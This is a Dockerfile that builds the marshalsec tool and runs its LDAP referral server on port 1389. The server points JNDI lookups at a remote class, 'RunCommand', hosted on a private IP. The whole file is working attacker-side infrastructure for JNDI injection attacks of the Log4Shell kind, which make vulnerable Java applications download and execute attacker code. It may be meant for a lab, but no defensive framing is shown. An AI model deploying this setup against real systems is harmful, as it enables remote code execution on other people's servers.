FROM maven:latest

WORKDIR /src

RUN git clone https://github.com/mbechler/marshalsec.git

WORKDIR /src/marshalsec

RUN mvn clean package -DskipTests


FROM openjdk:latest

WORKDIR /app

COPY --from=0 /src/marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar app.jar

ENTRYPOINT [ "java", "-cp", "app.jar", "marshalsec.jndi.LDAPRefServer", "http://10.0.1.10/#RunCommand", "1389" ]